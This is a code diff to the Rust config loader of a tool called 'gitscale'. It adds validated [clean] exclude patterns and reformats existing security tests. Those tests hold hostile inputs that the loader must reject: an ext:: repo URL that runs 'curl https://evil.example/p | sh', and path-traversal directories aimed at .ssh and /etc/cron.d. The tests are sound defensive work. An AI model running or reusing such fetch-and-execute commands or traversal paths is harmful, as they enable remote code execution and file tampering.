@@ -106,12 +106,27 @@ pub struct Share {
     pub dissociate: bool,
 }
 
+/// Which untracked files `gitscale clean` keeps.
+///
+/// Scoped to the repo whose config it appears in, and nothing below it: a
+/// sub-repository knows its own build outputs and local scaffolding, so it
+/// declares them in its own `.gitscale.toml` rather than having the root
+/// enumerate them on its behalf.
+#[derive(Debug, Clone, Default)]
+pub struct Clean {
+    /// gitignore-syntax patterns, anchored at this repo's root. Passed to
+    /// `git clean -e` unchanged, so a pattern means exactly what the same
+    /// text on a `.gitignore` line would.
+    pub exclude: Vec<String>,
+}
+
 #[derive(Debug, Clone, Default)]
 pub struct GitScaleConfig {
     pub repos: Vec<RepoEntry>,
     pub storage_url: String,
     pub hooks: Hooks,
     pub share: Share,
+    pub clean: Clean,
 }
 
 #[derive(Deserialize)]
@@ -120,6 +135,12 @@ struct RawConfig {
     repos: Option<BTreeMap<String, RawRepo>>,
     hooks: Option<RawHooks>,
     share: Option<RawShare>,
+    clean: Option<RawClean>,
+}
+
+#[derive(Deserialize)]
+struct RawClean {
+    exclude: Option<Vec<String>>,
 }
 
 #[derive(Deserialize)]
@@ -184,11 +205,14 @@ pub fn load_config(config_path: &Path) -> Result<GitScaleConfig> {
             .unwrap_or(false),
     };
 
+    let clean = parse_clean(raw.clean.as_ref(), config_path)?;
+
     Ok(GitScaleConfig {
         repos,
         storage_url,
         hooks,
         share,
+        clean,
     })
 }
 
@@ -257,7 +281,10 @@ fn check_url(url: &str, what: &str, config_path: &Path) -> Result<()> {
 fn check_directory(directory: &str, config_path: &Path) -> Result<()> {
     let path = Path::new(directory);
     if directory.is_empty() {
-        bail!("{}: a repo directory cannot be empty", config_path.display());
+        bail!(
+            "{}: a repo directory cannot be empty",
+            config_path.display()
+        );
     }
     if path.is_absolute() {
         bail!(
@@ -287,6 +314,26 @@ fn parse_storage(raw: Option<&RawStorage>, config_path: &Path) -> Result<String>
         }
         _ => bail!("{}: storage.url is required", config_path.display()),
     }
+}
+
+/// `[clean] exclude`. Patterns reach `git clean -e` as arguments, so one
+/// starting with `-` would arrive as a flag rather than as a pattern — the
+/// same hazard `check_not_option_like` covers for URLs and revisions.
+fn parse_clean(raw: Option<&RawClean>, config_path: &Path) -> Result<Clean> {
+    let Some(clean) = raw else {
+        return Ok(Clean::default());
+    };
+    let exclude = clean.exclude.clone().unwrap_or_default();
+    for pattern in &exclude {
+        if pattern.is_empty() {
+            bail!(
+                "{}: clean.exclude contains an empty pattern",
+                config_path.display()
+            );
+        }
+        check_not_option_like(pattern, "clean.exclude entry", config_path)?;
+    }
+    Ok(Clean { exclude })
 }
 
 fn parse_repos(
@@ -421,6 +468,18 @@ pub fn write_config(config_path: &Path, config: &GitScaleConfig) -> Result<()> {
         lines.push(String::new());
     }
 
+    if !config.clean.exclude.is_empty() {
+        lines.push("[clean]".to_string());
+        let patterns: Vec<String> = config
+            .clean
+            .exclude
+            .iter()
+            .map(|p| toml_string(p))
+            .collect();
+        lines.push(format!("exclude = [{}]", patterns.join(", ")));
+        lines.push(String::new());
+    }
+
     if !config.repos.is_empty() {
         lines.push("[repos]".to_string());
         for entry in &config.repos {
@@ -492,9 +551,11 @@ url = "https://storage.example.com/bucket"
     fn remote_helper_urls_are_refused() {
         // `ext::` runs the rest of the URL as a command: code execution from a
         // repo URL alone, with no [hooks] table in sight.
-        let err = load(r#"[repos]
+        let err = load(
+            r#"[repos]
 "libs/a" = { url = "ext::sh -c 'curl https://evil.example/p | sh'", revision = "main" }
-"#)
+"#,
+        )
         .unwrap_err()
         .to_string();
         assert!(err.contains("remote helper"), "{}", err);
@@ -527,8 +588,12 @@ url = "https://storage.example.com/bucket"
             "[repos]\n\"../../../home/dev/.ssh\" = { url = \"https://example.com/a.git\" }\n"
         )
         .is_err());
-        assert!(load("[repos]\n\"/etc/cron.d\" = { url = \"https://example.com/a.git\" }\n").is_err());
+        assert!(
+            load("[repos]\n\"/etc/cron.d\" = { url = \"https://example.com/a.git\" }\n").is_err()
+        );
         // A `..` in the middle escapes just as well as one at the front.
-        assert!(load("[repos]\n\"libs/../../x\" = { url = \"https://example.com/a.git\" }\n").is_err());
+        assert!(
+            load("[repos]\n\"libs/../../x\" = { url = \"https://example.com/a.git\" }\n").is_err()
+        );
     }
 }
